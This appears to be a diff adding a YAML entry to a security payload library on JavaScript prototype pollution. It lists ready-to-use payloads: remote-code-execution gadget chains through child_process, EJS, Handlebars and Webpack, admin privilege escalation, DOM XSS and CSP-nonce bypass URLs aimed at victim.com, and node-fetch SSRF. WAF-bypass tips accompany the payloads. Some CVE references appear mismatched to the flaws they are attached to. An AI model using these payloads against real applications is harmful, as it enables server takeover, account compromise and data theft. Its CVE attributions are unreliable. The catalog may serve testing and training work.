@@ -1,0 +1,410 @@
+slug: prototype-pollution
+name: Prototype Pollution (JavaScript)
+owasp: A03:2021 – Injection
+description: 'Prototype pollution allows attackers to inject properties into JavaScript''s Object prototype, affecting all
+  objects in the application. Server-side (Node.js) prototype pollution can achieve RCE via gadget chains; client-side pollution
+  enables XSS, CSP bypass, and DOM manipulation. The attack exploits recursive merge, deep clone, or path assignment functions.
+
+  '
+severity_range:
+  low: CVSS 5.3 – DOM manipulation, logic bypass
+  high: CVSS 9.8 – RCE via server-side gadget chains
+references:
+- label: PortSwigger Prototype Pollution Research
+  url: https://portswigger.net/web-security/prototype-pollution
+- label: OWASP Prototype Pollution Prevention
+  url: https://owasp.org/www-community/attacks/Prototype_Pollution
+groups:
+- slug: server-side-pollution
+  name: Server-Side Prototype Pollution (Node.js)
+  description: Exploiting Node.js object merging without prototype protection for RCE or privilege escalation
+  difficulty: high
+  prerequisites:
+  - Node.js application merges user-controlled JSON into objects without sanitization
+  payloads:
+  - id: proto-srv-001
+    title: RCE via child_process spawn options pollution
+    payload_string: '{"__proto__":{"shell":true,"env":{"NODE_OPTIONS":"--require /proc/self/fd/0"}}}
+
+      '
+    how_it_works: 'When Object.prototype is polluted with shell:true and env modifications, subsequent calls to child_process.spawn()
+      or exec() in the application inherit these options from the prototype. The NODE_OPTIONS environment variable can load
+      arbitrary JavaScript by requiring a file. Combined with /proc/self/fd/0 (stdin), this causes Node.js child processes
+      to execute attacker-controlled code. This is a well-known server-side prototype pollution gadget chain.
+
+      '
+    prerequisites:
+    - Application calls child_process functions after user-controlled object merge
+    - Merge function does not filter __proto__
+    waf_bypass_notes: JSON in request body; __proto__ key may be filtered by some middleware
+    severity_context: CVSS 9.8 – RCE via Node.js prototype pollution gadget chain
+    cve_refs:
+    - CVE-2021-3807
+    tags:
+    - prototype-pollution
+    - server-side
+    - rce
+    - nodejs
+    - gadget-chain
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: proto-srv-002
+    title: Server-side privilege escalation via isAdmin pollution
+    payload_string: '{"__proto__":{"isAdmin":true}}'
+    how_it_works: 'If Object.prototype is polluted with isAdmin:true before the application checks user.isAdmin, the prototype
+      chain provides the truthy value for all objects. When the authorization check reads obj.isAdmin, JavaScript traverses
+      the prototype chain and finds the injected property. This works even on freshly created objects that never had isAdmin
+      set explicitly.  Any object created after the pollution will appear to have admin privileges.
+
+      '
+    prerequisites:
+    - Authorization check reads property from prototype-polluted object
+    - Merge of user-controlled JSON occurs before auth check
+    waf_bypass_notes: Use constructor.prototype or __proto__ depending on merge implementation
+    severity_context: CVSS 9.8 – privilege escalation to admin via prototype chain traversal
+    cve_refs:
+    - CVE-2019-10744
+    tags:
+    - prototype-pollution
+    - server-side
+    - privilege-escalation
+    - auth-bypass
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: proto-srv-003
+    title: Prototype pollution via constructor.prototype
+    payload_string: '{"constructor":{"prototype":{"isAdmin":true,"role":"admin"}}}'
+    how_it_works: 'The constructor.prototype path is an alternative to __proto__ for reaching Object.prototype. Some implementations
+      sanitize __proto__ but forget to block constructor.prototype paths. When a deep merge function recursively assigns constructor.prototype.isAdmin
+      = true, it has the same effect as __proto__ pollution. This technique bypasses partial defenses that only check for
+      the __proto__ key name.
+
+      '
+    prerequisites:
+    - Deep merge function follows constructor.prototype path
+    - __proto__ key is blocked but constructor is not
+    waf_bypass_notes: Bypasses __proto__ filters; use when __proto__ is sanitized
+    severity_context: CVSS 9.8 – prototype pollution bypass via constructor path
+    cve_refs:
+    - CVE-2020-7608
+    tags:
+    - prototype-pollution
+    - constructor-prototype
+    - bypass
+    - server-side
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: proto-srv-004
+    title: Express.js query parameter prototype pollution
+    payload_string: GET /search?__proto__[isAdmin]=true HTTP/1.1
+    how_it_works: 'Express.js uses the qs library to parse query strings, which supports nested objects via bracket notation.
+      A query string with __proto__[isAdmin]=true causes qs to create an object with __proto__.isAdmin set to "true". If the
+      parsed query object is merged into application state or used to construct another object, prototype pollution can occur.
+      This vector requires no JSON body—the attack is in the URL query string.
+
+      '
+    prerequisites:
+    - Application merges qs-parsed query parameters into objects
+    - No __proto__ sanitization in qs or application
+    waf_bypass_notes: URL query string; try different bracket notations
+    severity_context: CVSS 7.5 – prototype pollution via URL query parameter
+    cve_refs:
+    - CVE-2020-7608
+    tags:
+    - prototype-pollution
+    - query-string
+    - qs
+    - express
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: proto-srv-005
+    title: Lodash merge prototype pollution
+    payload_string: 'const _ = require(''lodash'');
+
+      const payload = JSON.parse(''{"__proto__":{"polluted":true}}'');
+
+      _.merge({}, payload);
+
+      console.log({}.polluted); // true
+
+      '
+    how_it_works: 'Lodash''s _.merge() and _.mergeWith() functions were historically vulnerable to prototype pollution. When
+      merging an object with a __proto__ key, older versions of Lodash would recursively assign properties to Object.prototype.
+      After merging, all subsequently created objects inherit the polluted properties. CVE-2019-10744 affected Lodash < 4.17.12.
+      Applications using vulnerable Lodash versions and merging user-controlled data are affected.
+
+      '
+    prerequisites:
+    - Lodash < 4.17.12 in use
+    - User-controlled data passed to _.merge()
+    waf_bypass_notes: Same JSON payload; depends on Lodash version
+    severity_context: CVSS 7.5 – prototype pollution via Lodash merge with user data
+    cve_refs:
+    - CVE-2019-10744
+    tags:
+    - prototype-pollution
+    - lodash
+    - merge
+    - cve
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+- slug: client-side-pollution
+  name: Client-Side Prototype Pollution
+  description: DOM-based XSS and CSP bypass via browser-side prototype pollution in JavaScript
+  difficulty: high
+  prerequisites:
+  - Client-side JavaScript merges URL parameters or JSON without sanitization
+  payloads:
+  - id: proto-cli-001
+    title: DOM XSS via prototype pollution (innerHTML sink)
+    payload_string: https://victim.com/?__proto__[innerHTML]=<img src=x onerror=alert(1)>
+    how_it_works: 'Client-side code that uses Object.assign() or deep merge to apply URL parameters to configuration objects
+      can be used to pollute Object.prototype. If application code later creates a new element and sets el[someKey] = config.someKey,
+      but config has polluted inherited properties, the innerHTML or similar sink receives the attacker''s payload. DOM XSS
+      via prototype pollution often bypasses XSS filters that only check explicit user input without considering inherited
+      object properties.
+
+      '
+    prerequisites:
+    - Client-side JS merges URL params into objects
+    - Object properties used in DOM sinks without sanitization
+    waf_bypass_notes: URL-based attack; server-side WAF may not inspect fragment or client-side merge
+    severity_context: CVSS 6.1 – DOM XSS via prototype pollution gadget in client-side code
+    cve_refs: []
+    tags:
+    - prototype-pollution
+    - client-side
+    - dom-xss
+    - url-params
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: proto-cli-002
+    title: CSP bypass via prototype pollution
+    payload_string: https://victim.com/?__proto__[cspNonce]=attacker-nonce
+    how_it_works: 'Some applications generate CSP nonces server-side and pass them to client-side rendering via JavaScript
+      objects. If prototype pollution can override the nonce value used when rendering script tags, an attacker can supply
+      a known nonce and create script elements that pass the CSP check. This bypasses Content Security Policy by exploiting
+      the nonce generation/usage in JavaScript rather than attacking the CSP header itself.
+
+      '
+    prerequisites:
+    - CSP nonce passed through JavaScript object vulnerable to pollution
+    - Client-side rendering creates script tags using prototype-accessible nonce
+    waf_bypass_notes: CSP bypass via nonce value pollution; bypasses all script-src restrictions
+    severity_context: CVSS 7.5 – CSP nonce bypass via prototype pollution enabling XSS
+    cve_refs: []
+    tags:
+    - prototype-pollution
+    - client-side
+    - csp-bypass
+    - nonce
+    - xss
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: proto-cli-003
+    title: Prototype pollution via JSON.parse with reviver
+    payload_string: "JSON.parse('{\"__proto__\":{\"polluted\":true}}', (k,v) => {\n  if(k === '__proto__') Object.assign(Object.prototype,\
+      \ v);\n  return v;\n});\n"
+    how_it_works: 'JSON.parse() itself does not pollute prototypes; JSON.__proto__ is just a regular property. However, some
+      libraries implement custom revivers that interpret __proto__ keys and merge them into prototypes. This pattern appears
+      in certain BSON parsers, JSON5 implementations, and custom deserialization code. The reviver function processes every
+      key-value pair and may incorrectly elevate __proto__ to prototype pollution if not specifically guarded.
+
+      '
+    prerequisites:
+    - Custom JSON reviver that processes __proto__ keys
+    - User-controlled JSON processed by the vulnerable parser
+    waf_bypass_notes: Depends on parser implementation; standard JSON input
+    severity_context: CVSS 7.5 – prototype pollution via custom JSON parser reviver
+    cve_refs: []
+    tags:
+    - prototype-pollution
+    - client-side
+    - json-parse
+    - reviver
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: proto-cli-004
+    title: jQuery $.extend() deep prototype pollution
+    payload_string: '$.extend(true, {}, JSON.parse(''{"__proto__":{"isAdmin":true}}''));
+
+      '
+    how_it_works: 'jQuery''s $.extend() with the deep=true option performs recursive object merging. Older jQuery versions
+      (< 3.4.0) did not filter __proto__ during deep extension. When user-controlled JSON is passed to $.extend(true, target,
+      source), the __proto__ properties are recursively assigned to Object.prototype. Applications using jQuery < 3.4.0 that
+      extend configuration objects with user data are vulnerable to prototype pollution via this widely-used library.
+
+      '
+    prerequisites:
+    - jQuery < 3.4.0 in use
+    - User data passed to $.extend(true, ...)
+    waf_bypass_notes: Standard JSON input; depends on jQuery version
+    severity_context: CVSS 6.4 – prototype pollution via jQuery deep extend
+    cve_refs:
+    - CVE-2019-11358
+    tags:
+    - prototype-pollution
+    - jquery
+    - extend
+    - client-side
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: proto-cli-005
+    title: Prototype pollution via URL hash (#) parsing
+    payload_string: https://victim.com/#__proto__[isAdmin]=true
+    how_it_works: 'SPA frameworks that parse URL hash fragments for routing or state restoration may deserialize hash content
+      into JavaScript objects. If the hash parser uses a library like qs or manually implements bracket notation parsing without
+      sanitizing __proto__, the hash fragment can pollute Object.prototype. The hash is not sent to the server, making this
+      attack invisible to server-side monitoring and WAFs. Only client-side JavaScript processes the hash.
+
+      '
+    prerequisites:
+    - SPA parses URL hash with vulnerable library
+    - Parsed hash object merged into application state
+    waf_bypass_notes: Hash fragment not sent to server; entirely client-side and invisible to WAF
+    severity_context: CVSS 6.1 – client-side prototype pollution via URL hash; no server-side visibility
+    cve_refs:
+    - CVE-2019-11358
+    tags:
+    - prototype-pollution
+    - client-side
+    - hash-fragment
+    - spa
+    - url
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+- slug: pollution-gadget-chains
+  name: Prototype Pollution Gadget Chains
+  description: Leveraging polluted prototype properties to trigger RCE or escalation via application gadgets
+  difficulty: expert
+  prerequisites:
+  - Object.prototype successfully polluted
+  - Application code contains gadget using the polluted property
+  payloads:
+  - id: proto-gadget-001
+    title: EJS template injection via prototype pollution
+    payload_string: '{"__proto__":{"outputFunctionName":"_tmp1;global.process.mainModule.require(''child_process'').execSync(''id
+      > /tmp/x'');_tmp2"}}
+
+      '
+    how_it_works: 'EJS (Embedded JavaScript Templates) uses configuration options like outputFunctionName to name the internal
+      output function. If this option is read from Object.prototype (because the options object inherits from the polluted
+      prototype), an attacker can set it to JavaScript code that is concatenated into the generated template function body.
+      When the template is rendered, the injected code executes with the process privileges. This is a well-known EJS prototype
+      pollution gadget.
+
+      '
+    prerequisites:
+    - Application uses EJS for template rendering
+    - Object.prototype successfully polluted with outputFunctionName
+    waf_bypass_notes: Pollution occurs during request parsing; template execution is delayed
+    severity_context: CVSS 9.8 – RCE via EJS template gadget triggered by prototype pollution
+    cve_refs:
+    - CVE-2022-29078
+    tags:
+    - prototype-pollution
+    - ejs
+    - rce
+    - template-injection
+    - gadget-chain
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: proto-gadget-002
+    title: Handlebars template RCE via prototype pollution
+    payload_string: '{"__proto__":{"type":"Program","body":[{"type":"MustacheStatement","path":{"type":"PathExpression","original":"process.mainModule.require(''child_process'').execSync(''id'')","parts":["process"]}}]}}
+
+      '
+    how_it_works: 'Handlebars compiles templates by parsing them into AST nodes and generating JavaScript functions. If prototype
+      pollution allows injecting AST node types into the Object.prototype, the Handlebars compiler may traverse these and
+      generate JavaScript that executes arbitrary code. The attack replaces Handlebars'' sanitization path by providing a
+      pre-built AST that bypasses the template compiler''s safety checks.
+
+      '
+    prerequisites:
+    - Application uses Handlebars for template compilation
+    - Object.prototype polluted with AST node types
+    waf_bypass_notes: Complex AST structure; requires understanding of Handlebars internals
+    severity_context: CVSS 9.8 – RCE via Handlebars AST gadget through prototype pollution
+    cve_refs:
+    - CVE-2021-23369
+    tags:
+    - prototype-pollution
+    - handlebars
+    - rce
+    - ast
+    - gadget-chain
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: proto-gadget-003
+    title: Node-fetch SSRF via prototype pollution (agent option)
+    payload_string: '{"__proto__":{"agent":{"protocol":"file:"}}}
+
+      '
+    how_it_works: 'The node-fetch library uses an agent option for HTTP proxying. If Object.prototype is polluted with an
+      agent property specifying a file: protocol handler, subsequent node-fetch calls inherit this agent and may access local
+      filesystem paths. This converts a prototype pollution vulnerability into an SSRF/LFI chain, allowing reading of local
+      files or accessing internal services through the fetch agent configuration.
+
+      '
+    prerequisites:
+    - Application uses node-fetch after prototype pollution point
+    - No explicit agent parameter in fetch calls
+    waf_bypass_notes: SSRF occurs server-side; combined with pollution for full exploit
+    severity_context: CVSS 8.8 – SSRF/LFI via node-fetch agent gadget after prototype pollution
+    cve_refs: []
+    tags:
+    - prototype-pollution
+    - node-fetch
+    - ssrf
+    - lfi
+    - gadget-chain
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: proto-gadget-004
+    title: Prototype pollution detection via error message leak
+    payload_string: '{"__proto__":{"toJSON":"polluted"}}
+
+      '
+    how_it_works: 'Before exploiting prototype pollution, an attacker needs to confirm that pollution is occurring. By setting
+      __proto__.toJSON to a string, JSON.stringify() calls on any object will invoke this property. If the application returns
+      stringified objects in error messages or API responses, the "polluted" string appearing indicates successful prototype
+      pollution. This is a non-destructive detection payload used before committing to exploitation.
+
+      '
+    prerequisites:
+    - Application returns JSON-stringified objects in responses
+    waf_bypass_notes: Non-destructive detection payload; use before exploitation
+    severity_context: CVSS 3.1 – detection/reconnaissance technique; confirms pollution is possible
+    cve_refs: []
+    tags:
+    - prototype-pollution
+    - detection
+    - recon
+    - toJSON
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: proto-gadget-005
+    title: Webpack require cache poisoning via pollution
+    payload_string: '{"__proto__":{"sourceURL":"\nrequire(''child_process'').execSync(''id'')//"}}
+
+      '
+    how_it_works: 'Some Webpack configurations use Object.prototype properties to set source map URLs or eval() contexts.
+      By polluting Object.prototype.sourceURL with JavaScript code followed by a comment, the code is injected into eval()
+      contexts that Webpack or module systems use for source mapping. When the module system evals the polluted source URL,
+      the injected code executes. This is a less common but recognized gadget in Webpack-heavy applications.
+
+      '
+    prerequisites:
+    - Application uses Webpack with eval-based source maps
+    - Object.prototype polluted before module evaluation
+    waf_bypass_notes: Source URL injection via prototype; indirect execution path
+    severity_context: CVSS 8.8 – RCE via Webpack source URL eval gadget
+    cve_refs: []
+    tags:
+    - prototype-pollution
+    - webpack
+    - eval
+    - source-map
+    - gadget-chain
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
